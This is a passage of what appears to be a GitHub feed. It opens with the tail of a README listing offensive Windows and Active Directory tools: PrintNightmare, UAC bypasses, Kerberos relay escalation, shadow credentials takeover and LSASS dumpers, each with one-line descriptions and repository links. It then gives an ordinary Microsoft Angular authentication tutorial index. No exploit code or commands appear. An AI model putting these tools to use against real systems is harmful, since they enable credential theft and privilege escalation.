&#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/0xthirteen/SharpMove&#34;&gt;https://github.com/0xthirteen/SharpMove&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpStay&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.NET project for installing Persistence&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/0xthirteen/SharpStay&#34;&gt;https://github.com/0xthirteen/SharpStay&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpPrintNightmare&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare&#34;&gt;https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Certify&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Active Directory certificate abuse.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;https://github.com/GhostPack/Certify&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Farmer&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Farmer is a project for collecting NetNTLM hashes in a Windows domain. Farmer achieves this by creating a local WebDAV server that causes the WebDAV Mini Redirector to authenticate from any connecting clients.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/mdsecactivebreach/Farmer&#34;&gt;https://github.com/mdsecactivebreach/Farmer&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpBypassUAC&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# tool for UAC bypasses&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FatRodzianko/SharpBypassUAC&#34;&gt;https://github.com/FatRodzianko/SharpBypassUAC&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;StandIn&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;StandIn is a small .NET35/45 AD post-exploitation toolkit&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FuzzySecurity/StandIn&#34;&gt;https://github.com/FuzzySecurity/StandIn&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Carbuncle&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tool for interacting with outlook interop during red team engagements&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/checkymander/Carbuncle&#34;&gt;https://github.com/checkymander/Carbuncle&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Whisker&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding &#34;Shadow Credentials&#34; to the target account.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/eladshamir/Whisker&#34;&gt;https://github.com/eladshamir/Whisker&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpLdapRelayScan&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# Port of LdapRelayScan&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/klezVirus/SharpLdapRelayScan&#34;&gt;https://github.com/klezVirus/SharpLdapRelayScan&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;LdapSignCheck&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# project to check LDAP signing.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/cube0x0/LdapSignCheck&#34;&gt;https://github.com/cube0x0/LdapSignCheck&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;KrbRelayUp&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;KrbRelayUp - a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Dec0ne/KrbRelayUp&#34;&gt;https://github.com/Dec0ne/KrbRelayUp&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpImpersonation&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpImpersonation - A User Impersonation tool - via Token or Shellcode injection.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/SharpImpersonation&#34;&gt;https://github.com/S3cur3Th1sSh1t/SharpImpersonation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpWSUS&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpWSUS is a CSharp tool for lateral movement through WSUS. There is a corresponding blog (&lt;a href=&#34;https://labs.nettitude.com/blog/introducing-sharpwsus/&#34;&gt;https://labs.nettitude.com/blog/introducing-sharpwsus/&lt;/a&gt;) which has more detailed information about the tooling, use case and detection.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/nettitude/SharpWSUS&#34;&gt;https://github.com/nettitude/SharpWSUS&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;MalSCCM&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage. To use this tool your current process must have admin rights over the SCCM server. Typically deployments of SCCM will either have the management server and the primary server on the same host, in which case the host returned from the locate command can be used as the primary server.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/nettitude/MalSCCM&#34;&gt;https://github.com/nettitude/MalSCCM&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;KrbRelay&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Framework for Kerberos relaying&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;https://github.com/cube0x0/KrbRelay&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;&lt;em&gt;The last two are basically no Assemblies. But I did built an Assembly to execute them from memory, which is loadable via the technique from this repo. Another technique in the background for execution, but still usefull&lt;/em&gt;:&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;HandleKatz&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;PIC lsass dumper using cloned handles&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/codewhitesec/HandleKatz&#34;&gt;https://github.com/codewhitesec/HandleKatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;NanoDump&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Dump LSASS like you mean it&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/helpsystems/nanodump&#34;&gt;https://github.com/helpsystems/nanodump&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;PPLDump&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Dump the memory of a PPL with a userland exploit&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/itm4n/PPLdump&#34;&gt;https://github.com/itm4n/PPLdump&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Azure-Samples/ms-identity-javascript-angular-tutorial</title>
    <updated>2022-06-11T01:58:16Z</updated>
    <id>tag:github.com,2022-06-11:/Azure-Samples/ms-identity-javascript-angular-tutorial</id>
    <link href="https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A chapterwise tutorial that will take you through the fundamentals of modern authentication with Microsoft identity platform in Angular using MSAL Angular v2&lt;/p&gt;&lt;hr&gt;&lt;hr&gt; &#xA;&lt;p&gt;page_type: sample languages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;javascript&lt;/li&gt; &#xA; &lt;li&gt;typescript&lt;/li&gt; &#xA; &lt;li&gt;csharp products:&lt;/li&gt; &#xA; &lt;li&gt;angular&lt;/li&gt; &#xA; &lt;li&gt;dotnet&lt;/li&gt; &#xA; &lt;li&gt;msal-js&lt;/li&gt; &#xA; &lt;li&gt;ms-graph&lt;/li&gt; &#xA; &lt;li&gt;azure-storage&lt;/li&gt; &#xA; &lt;li&gt;azure-app-service&lt;/li&gt; &#xA; &lt;li&gt;azure-key-vault&lt;/li&gt; &#xA; &lt;li&gt;azure-active-directory&lt;/li&gt; &#xA; &lt;li&gt;azure-active-directory-b2c&lt;/li&gt; &#xA; &lt;li&gt;microsoft-identity-web description: &#34;Tutorial: Enable your Angular single-page application to sign-in users and call APIs with the Microsoft identity platform&#34; urlFragment: &#34;ms-identity-javascript-angular-tutorial&#34;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Tutorial: Enable your Angular single-page application to sign-in users and call APIs with the Microsoft identity platform&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/node.js.yml&#34;&gt;&lt;img src=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/node.js.yml/badge.svg?sanitize=true&#34; alt=&#34;Node Build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/dotnet.yml&#34;&gt;&lt;img src=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/dotnet.yml/badge.svg?sanitize=true&#34; alt=&#34;.NET Build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/codeql.yml&#34;&gt;&lt;img src=&#34;https://github.com/Azure-Samples/ms-identity-javascript-angular-tutorial/actions/workflows/codeql.yml/badge.svg?sanitize=true&#34; alt=&#34;Code Scan&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/issues/Azure-Samples/ms-identity-javascript-angular-tutorial&#34; alt=&#34;GitHub issues&#34;&gt; &lt;img src=&#34;https://img.shields.io/npm/v/@azure/msal-browser?label=msal-browser&#34; alt=&#34;npm&#34;&gt; &lt;img src=&#34;https://img.shields.io/npm/v/@azure/msal-angular?label=msal-angular&#34; alt=&#34;npm&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/license/Azure-Samples/ms-identity-javascript-angular-tutorial&#34; alt=&#34;GitHub&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/v2-overview&#34;&gt;Microsoft identity platform&lt;/a&gt;, along with &lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/fundamentals/active-directory-whatis&#34;&gt;Azure Active Directory&lt;/a&gt; (Azure AD) and &lt;a href=&#34;https://docs.microsoft.com/azure/active-directory-b2c/overview&#34;&gt;Azure Azure Active Directory B2C&lt;/a&gt; (Azure AD B2C) are central to the &lt;strong&gt;Azure&lt;/strong&gt; cloud ecosystem. This tutorial aims to take you through the fundamentals of modern authentication with Angular, using the &lt;a href=&#34;https://github.com/AzureAD/microsoft-authentication-library-for-js/tree/dev/lib/msal-angular&#34;&gt;Microsoft Authentication Library for Angular&lt;/a&gt; (MSAL Angular).&lt;/p&gt; &#xA;&lt;p&gt;We recommend following the chapters in successive order. However, the code samples are self-contained, so feel free to pick samples by topics that you may need at the moment.&lt;/p&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nodejs.org/en/download/&#34;&gt;Node.js&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dotnet.microsoft.com/download&#34;&gt;Dotnet Core SDK&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://code.visualstudio.com/download&#34;&gt;Visual Studio Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-vscode.vscode-node-azure-pack&#34;&gt;VS Code Azure Tools Extension&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;A modern web browser&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please refer to each sample&#39;s README for sample-specific prerequisites.&lt;/p&gt; &#xA;&lt;h2&gt;Recommendations&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jwt.ms&#34;&gt;jwt.ms&lt;/a&gt; for inspecting your tokens&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.telerik.com/fiddler&#34;&gt;Fiddler&lt;/a&gt; for monitoring your network activity and troubleshooting&lt;/li&gt; &#xA; &lt;li&gt;Check &lt;a href=&#34;https://github.com/AzureAD/microsoft-authentication-library-for-js/raw/dev/lib/msal-browser/FAQ.md&#34;&gt;MSAL.js FAQ&lt;/a&gt; and &lt;a href=&#34;https://github.com/AzureAD/microsoft-authentication-library-for-js/raw/dev/lib/msal-angular/docs/FAQ.md&#34;&gt;MSAL Angular FAQ&lt;/a&gt; for your questions&lt;/li&gt; &#xA; &lt;li&gt;Follow the &lt;a href=&#34;https://techcommunity.microsoft.com/t5/azure-active-directory-identity/bg-p/Identity&#34;&gt;Azure AD Blog&lt;/a&gt; to stay up-to-date with the latest developments&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please refer to each sample&#39;s README for sample-specific recommendations.&lt;/p&gt; &#xA;&lt;h2&gt;Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For &lt;strong&gt;Azure AD&lt;/strong&gt;, start the tutorial from &lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/1-sign-in/README-incremental.md&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;For &lt;strong&gt;Azure AD B2C&lt;/strong&gt;, start the tutorial from &lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/2-sign-in-b2c/README-incremental.md&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Alternatively, choose below the sample you want to review.&lt;/p&gt; &#xA;&lt;h3&gt;Chapter 1: Sign-in a user to your application&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/1-sign-in/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/1-sign-in/README.md&#34;&gt;&lt;strong&gt;Sign-in with Azure AD&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Sign-in your users with the &lt;strong&gt;Azure AD&lt;/strong&gt; and learn to work with &lt;strong&gt;ID Tokens&lt;/strong&gt;. Learn how &lt;strong&gt;single sign-on (SSO)&lt;/strong&gt; works. Learn to secure your apps to operate in &lt;strong&gt;national clouds&lt;/strong&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/2-sign-in-b2c/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/1-Authentication/2-sign-in-b2c/README.md&#34;&gt;&lt;strong&gt;Sign-in with Azure AD B2C&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Sign-in your customers with &lt;strong&gt;Azure AD B2C&lt;/strong&gt;. Learn to integrate with &lt;strong&gt;external social identity providers&lt;/strong&gt;. Learn how to use &lt;strong&gt;user-flows&lt;/strong&gt; and &lt;strong&gt;custom policies&lt;/strong&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 2: Sign-in a user and get an Access Token for Microsoft Graph&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/2-Authorization-I/1-call-graph/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/2-Authorization-I/1-call-graph/README.md&#34;&gt;&lt;strong&gt;Get an Access Token from Azure AD and call Microsoft Graph&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Authenticate your users and acquire an &lt;strong&gt;Access Token&lt;/strong&gt; for Microsoft Graph and then call the &lt;strong&gt;Microsoft Graph API&lt;/strong&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 3: Protect an API and call the API from your client app&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/3-Authorization-II/1-call-api/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/3-Authorization-II/1-call-api/README.md&#34;&gt;&lt;strong&gt;Protect and call a web API on Azure AD&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Protect your web API with the &lt;strong&gt;Azure AD&lt;/strong&gt;. Use a client application to sign-in a user, acquire an &lt;strong&gt;Access Token&lt;/strong&gt; for your web API and call your protected Web API.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/3-Authorization-II/2-call-api-b2c/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/3-Authorization-II/2-call-api-b2c/README.md&#34;&gt;&lt;strong&gt;Protect and call a web API on Azure AD B2C&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Protect your web API with &lt;strong&gt;Azure AD B2C&lt;/strong&gt;. Use a client application to sign-in a user, acquire an &lt;strong&gt;Access Token&lt;/strong&gt; for your web API and call your protected web API.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 4: Deploy your applications to Azure&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/4-Deployment/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/4-Deployment/README.md&#34;&gt;&lt;strong&gt;Deploy to Azure Storage and App Service&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Prepare your app for deployment to various &lt;strong&gt;Azure&lt;/strong&gt; services. Learn how to package and upload files, configure authentication parameters and use &lt;strong&gt;Azure&lt;/strong&gt; services for managing your operations.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 5: Control access to your protected API using App Roles and Security Groups&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/5-AccessControl/1-call-api-roles/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/5-AccessControl/1-call-api-roles/README.md&#34;&gt;&lt;strong&gt;Call a web API using App Roles&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Define App Roles and use roles claim in an ID Token to implement Role-based Access Control (RBAC) for your protected web API.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/5-AccessControl/2-call-api-groups/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/5-AccessControl/2-call-api-groups/README.md&#34;&gt;&lt;strong&gt;Call a web API using Security Groups&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Create Security Groups and use groups claim in an ID Token to implement Role-based Access Control (RBAC) for your protected web API. Handle overage scenarios.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 6: Develop and provision a multi-tenant SaaS application&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/6-Multitenancy/1-call-api-mt/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/6-Multitenancy/1-call-api-mt/README.md&#34;&gt;&lt;strong&gt;Call a multi-tenant web API from any tenant&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Understand multitenancy in Azure AD. Handle provisioning your app to other tenants and control who can access your resources.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Chapter 7: Dive into advanced scenarios&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/7-AdvancedScenarios/1-call-api-obo/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/7-AdvancedScenarios/1-call-api-obo/README.md&#34;&gt;&lt;strong&gt;Call Microsoft Graph using on-behalf-of flow&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Use OAuth 2.0 on-behalf-of flow to call Microsoft Graph from your client app via a .NET Core web API. Understand combined consent and &lt;strong&gt;.default&lt;/strong&gt; scope.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/7-AdvancedScenarios/2-call-api-pop/ReadmeFiles/topology.png&#34; width=&#34;200&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/ms-identity-javascript-angular-tutorial/main/7-AdvancedScenarios/2-call-api-pop/README.md&#34;&gt;&lt;strong&gt;Call a web API using Proof of Possession tokens&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; Acquire proof of possession (PoP) tokens. Learn how to prevent token replay attacks with PoP authentication scheme. Learn how to validate PoP tokens.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;We&#39;d love your feedback!&lt;/h2&gt; &#xA;&lt;p&gt;Were we successful in addressing your learning objective? Consider taking a moment to &lt;a href=&#34;https://forms.office.com/Pages/ResponsePage.aspx?id=v4j5cvGGr0GRqy180BHbR73pcsbpbxNJuZCMKN0lURpUOU5PNlM4MzRRV0lETkk2ODBPT0NBTEY5MCQlQCN0PWcu&#34;&gt;share your experience with us&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;More information&lt;/h2&gt; &#xA;&lt;p&gt;Learn more about the &lt;strong&gt;Microsoft identity platform&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/&#34;&gt;Microsoft identity platform&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory-b2c/&#34;&gt;Azure Active Directory B2C&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/msal-overview&#34;&gt;Overview of Microsoft Authentication Library (MSAL)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/v2-app-types&#34;&gt;Application types for Microsoft identity platform&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/application-consent-experience&#34;&gt;Understanding Azure AD application consent experiences&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/howto-convert-app-to-be-multi-tenant#understand-user-and-admin-consent&#34;&gt;Understand user and admin consent&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/app-objects-and-service-principals&#34;&gt;Application and service principal objects in Azure Active Directory&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/identity-platform-integration-checklist&#34;&gt;Microsoft identity platform best practices and recommendations&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See more code samples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/azure/active-directory/develop/sample-v2-code&#34;&gt;MSAL code samples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 